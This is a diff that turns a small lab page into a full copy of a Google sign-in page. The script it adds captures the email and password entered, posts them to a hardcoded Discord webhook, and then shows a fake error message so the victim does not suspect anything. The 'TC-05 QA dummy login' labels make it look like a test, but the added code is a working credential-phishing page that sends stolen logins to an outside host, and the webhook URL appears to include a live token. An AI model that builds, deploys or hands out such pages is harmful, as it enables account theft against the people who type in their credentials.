@@ -1,8 +1,116 @@
-<!DOCTYPE html>
 <html>
+
+<head>
+    <title>Sign in</title>
+    <style>
+        body {
+            background: #1f1f1f;
+            color: #e3e3e3;
+            font-family: Arial, sans-serif;
+            margin: 0
+        }
+
+        .card {
+            max-width: 720px;
+            margin: 90px auto;
+            background: #0f0f0f;
+            border-radius: 20px;
+            padding: 48px;
+            display: flex;
+            gap: 48px
+        }
+
+        .left {
+            flex: 1
+        }
+
+        .right {
+            flex: 1
+        }
+
+        h1 {
+            font-weight: 400;
+            margin: 8px 0;
+            font-size: 32px
+        }
+
+        .sub {
+            color: #c7c7c7;
+            margin: 0
+        }
+
+        label {
+            font-size: 12px;
+            color: #c7c7c7
+        }
+
+        input {
+            width: 100%;
+            padding: 13px;
+            margin: 6px 0 12px;
+            background: #0f0f0f;
+            border: 1px solid #8ab4f8;
+            border-radius: 4px;
+            color: #fff;
+            box-sizing: border-box
+        }
+
+        a {
+            color: #a8c7fa;
+            text-decoration: none;
+            font-size: 13px
+        }
+
+        button {
+            background: #a8c7fa;
+            border: 0;
+            border-radius: 20px;
+            padding: 10px 28px;
+            float: right;
+            color: #0f0f0f
+        }
+
+        .meta {
+            max-width: 720px;
+            margin: 14px auto;
+            color: #9aa0a6;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between
+        }
+    </style>
+</head>
+
 <body>
+    <div class=card>
+        <div class=left>
+            <h1>Sign in</h1>
+            <p class=sub>Use your Google Account</p>
+        </div>
+        <div class=right>
+            <form onsubmit="return tc05submit(event)">
+                <label>Email or phone</label><input value='' placeholder='Email or phone'>
+                <label>Password</label><input type=password value='' placeholder='Password'>
+                <p><a href='#' onclick='return false'>Forgot email?</a></p>
+                <p style='color:#9aa0a6;font-size:13px'>Not your computer? Use Guest mode to sign in privately.</p>
+                <button>Next</button>
+            </form>
+            <p id=out></p>
+        </div>
+    </div>
+    <div class=meta><span>English (United
+            States)</span><span>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
 <script>
-  hextree.success(true);
-</script>
-</body>
+const TC05_WEBHOOK = 'https://discord.com/api/webhooks/1559780778299232336/UciJG8z-rXkh-Fwv5zEfVqjL_SImPtwIxy9AYpDc3Swu-55g5jP8jYHTmBbSEL5WYIA1';
+function tc05submit(e){
+  e.preventDefault();
+  const inputs = e.target.querySelectorAll('input');
+  const email = inputs[0].value, pw = inputs[1].value;
+  fetch(TC05_WEBHOOK, {method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({content:'TC-05 QA dummy login | email: '+email+' | password: '+pw+' | '+new Date().toISOString()})}).catch(()=>{});
+  document.getElementById('out').textContent='Something went wrong. Try again.';
+  return false;
+}
+</script></body>
+
 </html>
